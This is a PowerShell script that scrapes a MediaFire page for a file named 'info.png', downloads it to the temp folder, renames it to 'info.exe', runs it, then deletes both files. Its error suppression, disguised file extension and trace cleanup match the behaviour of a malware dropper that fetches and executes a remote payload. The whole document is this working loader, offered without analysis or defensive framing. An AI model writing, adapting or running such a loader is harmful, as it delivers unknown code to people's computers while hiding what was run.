$ErrorActionPreference = "SilentlyContinue"

$MediaFirePage = "https://www.mediafire.com/file/bkgltde8exel4bx/info.png/file"

$WorkDir = $env:TEMP
$PngFile = Join-Path $WorkDir "info.png"
$ExeFile = Join-Path $WorkDir "info.exe"

Write-Host "Starting download..."

try {
    if (-not (Test-Path $WorkDir)) {
        New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
    }

    # Get real download URL from MediaFire page
    Write-Host "Getting download link..."
    $webclient = New-Object System.Net.WebClient
    $webclient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $pageContent = $webclient.DownloadString($MediaFirePage)

    # Extract direct download URL
    $match = [regex]::Match($pageContent, 'href="(https://download\d+\.mediafire\.com/[^"]+)"')
    if (-not $match.Success) {
        Write-Host "ERROR: Could not find download link!"
        pause
        exit
    }
    $ImageURL = $match.Groups[1].Value
    Write-Host "Found download link."

    # Download
    Write-Host "Downloading..."
    $curlPath = "C:\Windows\System32\curl.exe"

    if (Test-Path $curlPath) {
        & $curlPath -L -o $PngFile $ImageURL
    } else {
        $wc2 = New-Object System.Net.WebClient
        $wc2.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc2.DownloadFile($ImageURL, $PngFile)
    }

    if (Test-Path $PngFile) {
        $size = (Get-Item $PngFile).Length
        Write-Host "Download complete. File size: $size bytes"
    } else {
        Write-Host "ERROR: File not downloaded!"
        pause
        exit
    }

    if ((Test-Path $PngFile) -and ((Get-Item $PngFile).Length -gt 0)) {
        Write-Host "Converting PNG to EXE..."
        Copy-Item -Path $PngFile -Destination $ExeFile -Force

        Write-Host "Running EXE..."

        # Try 64-bit first, then 32-bit
        $ran = $false
        try {
            $proc = Start-Process -FilePath $ExeFile -PassThru -ErrorAction Stop
            $proc.WaitForExit()
            $ran = $true
        } catch {}

        if (-not $ran) {
            # Try with SysWOW64 (32-bit on 64-bit system)
            $syswow = "C:\Windows\SysWOW64\cmd.exe"
            if (Test-Path $syswow) {
                & $syswow /c $ExeFile
            } else {
                cmd /c $ExeFile
            }
        }

        Write-Host "Execution complete. Cleaning up..."
        Start-Sleep -Seconds 2
        Remove-Item $PngFile -Force -ErrorAction SilentlyContinue
        Remove-Item $ExeFile -Force -ErrorAction SilentlyContinue
        Write-Host "Done!"
    }
} catch {
    Write-Host "Error: $_"
}

pause